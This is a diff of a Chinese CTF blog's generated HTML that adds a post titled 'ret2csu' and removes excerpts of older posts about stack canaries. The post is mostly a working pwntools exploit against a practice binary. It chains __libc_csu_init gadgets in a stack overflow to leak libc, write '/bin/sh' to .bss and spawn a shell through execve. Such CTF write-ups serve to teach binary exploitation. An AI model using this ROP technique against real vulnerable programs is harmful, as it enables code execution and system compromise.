@@ -20,22 +20,26 @@
     <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="二进制萌新QAQ">
-    <meta name="description" content="二进制萌新QAQ">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Apr1L&#39;s blog">
-<meta property="og:url" content="http://suvii22.github.io/tags/canary/index.html">
+    <meta name="description" content="当没有合适 gadgets 可用的时候，可以找一找 __libc_csu_init 中的gadgets  具体分析过程见ctf wiki exp from pwn import *  from LibcSearcher import *  p = process(&apos;./level5&apos;) elf = ELF(&apos;./level5&apos;)  main = 0x400564 read_got = elf.go">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2csu">
+<meta property="og:url" content="http://suvii22.github.io/2020/08/08/ret2csu/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="二进制萌新QAQ">
+<meta property="og:description" content="当没有合适 gadgets 可用的时候，可以找一找 __libc_csu_init 中的gadgets  具体分析过程见ctf wiki exp from pwn import *  from LibcSearcher import *  p = process(&apos;./level5&apos;) elf = ELF(&apos;./level5&apos;)  main = 0x400564 read_got = elf.go">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2020/08/08/l8Vgbjavq5hsK7z.png">
+<meta property="og:updated_time" content="2020-08-08T02:39:56.940Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Apr1L&#39;s blog">
-<meta name="twitter:description" content="二进制萌新QAQ">
+<meta name="twitter:title" content="ret2csu">
+<meta name="twitter:description" content="当没有合适 gadgets 可用的时候，可以找一找 __libc_csu_init 中的gadgets  具体分析过程见ctf wiki exp from pwn import *  from LibcSearcher import *  p = process(&apos;./level5&apos;) elf = ELF(&apos;./level5&apos;)  main = 0x400564 read_got = elf.go">
+<meta name="twitter:image" content="https://i.loli.net/2020/08/08/l8Vgbjavq5hsK7z.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     
     <link rel="alternate" href="/atom.xml" title="Apr1L&#39;s blog" type="application/atom+xml">
     
-    <title>Apr1L&#39;s blog</title>
+    <title>ret2csu · Apr1L&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -216,12 +220,23 @@
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Apr1L&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">ret2csu</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Apr1L's blog</a>
 </header>
@@ -233,24 +248,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            ret2csu
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">296</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/08/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,133 +416,104 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/08/03/babystack/" >
-            
-                <span>babystack</span>
-        </a>
-        <div class="abstract-content">
-            babystack除了ASLR之外保护全开，存在明显栈溢出漏洞，不知道如何绕过canary
-调试过程断点下到触发 __stack_chk_fail 的地方，输入 ‘a’*0x1200，观察 rcx 的值（里面存放着原 canary 与 ‘aaaaaaaa’ xor 的结果）。
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>当没有合适 gadgets 可用的时候，可以找一找 __libc_csu_init 中的gadgets</p>
+<p><img src="https://i.loli.net/2020/08/08/l8Vgbjavq5hsK7z.png" alt="捕获.PNG"></p>
+<p>具体分析过程见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">ctf wiki</a></p>
+<p>exp</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-把 rcx 异或回去得到原 canary 的值 
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
 
-可以得到 stack_guard 存放在 $rbp+2008 的位置，0x1010+2008 = 0x1f70，也就是说我们可以覆盖 stack_guard 来绕过canary。看来在使用pthread时，TLS会被定位到与线程的栈空间相接近的位置。
-参考链接G...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/08/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "canary">canary</a>
-    
-</div>
-            
-        </div>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
+
+main <span class="token operator">=</span> <span class="token number">0x400564</span>
+read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+csu_front_addr <span class="token operator">=</span> <span class="token number">0x4005f0</span>
+csu_end_addr   <span class="token operator">=</span> <span class="token number">0x400606</span>
+
+<span class="token triple-quoted-string string">'''
+0x00000000004005f0 &lt;+80>:    mov    rdx,r15
+0x00000000004005f3 &lt;+83>:    mov    rsi,r14
+0x00000000004005f6 &lt;+86>:    mov    edi,r13d
+0x00000000004005f9 &lt;+89>:    call   QWORD PTR [r12+rbx*8]
+0x00000000004005fd &lt;+93>:    add    rbx,0x1
+0x0000000000400601 &lt;+97>:    cmp    rbx,rbp
+0x0000000000400604 &lt;+100>:    jne    0x4005f0 &lt;__libc_csu_init+80>
+0x0000000000400606 &lt;+102>:    mov    rbx,QWORD PTR [rsp+0x8]
+0x000000000040060b &lt;+107>:    mov    rbp,QWORD PTR [rsp+0x10]
+0x0000000000400610 &lt;+112>:    mov    r12,QWORD PTR [rsp+0x18]
+0x0000000000400615 &lt;+117>:    mov    r13,QWORD PTR [rsp+0x20]
+0x000000000040061a &lt;+122>:    mov    r14,QWORD PTR [rsp+0x28]
+0x000000000040061f &lt;+127>:    mov    r15,QWORD PTR [rsp+0x30]
+0x0000000000400624 &lt;+132>:    add    rsp,0x38
+0x0000000000400628 &lt;+136>:    ret   
+'''</span>
+
+<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span>rbp<span class="token punctuation">,</span>r12<span class="token punctuation">,</span>r13<span class="token punctuation">,</span>r14<span class="token punctuation">,</span>r15<span class="token punctuation">,</span>last<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>
+    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
+    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>last<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> payload
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>write_got<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>write_got<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00\x00'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> data<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+execve <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'execve'</span><span class="token punctuation">)</span>
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p.recvuntil('Hello, World\n')</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_got<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>
+l <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#p.recvuntil('Hello, World\n')</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
     </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/11/04/Syc-Geek-10th/" >
-            
-                <span>Syc Geek 10th</span>
-        </a>
-        <div class="abstract-content">
-            Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。
-先来看一下函数___stack_chk_fail源码：
-void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/04</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "canary">canary</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "shellcode">shellcode</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/08/攻防世界/" >
-            
-                <span>攻防世界</span>
-        </a>
-        <div class="abstract-content">
-            pwn1分析程序gdb-peda$ checksec babystack
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : FULL我们发现程序存在canary，并且没有system和/bin/sh，于是我们的思路就有了：
-
-通过程序的print函数leakcanary的值
-泄露puts真正地址，计算出libcbase
-构造ROP chain来get shell
-
-EXP#!usr/bin/python
-#-- coding: utf:8 --
-fro...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "canary">canary</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "栈溢出">栈溢出</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ROP">ROP</a>
-    
-</div>
-            
-        </div>
-    </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/08/04/Acid-burn/" title= "Acid burn">
+                    <div class="prevTitle">Acid burn</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -547,6 +583,24 @@ fro...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -893,6 +947,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
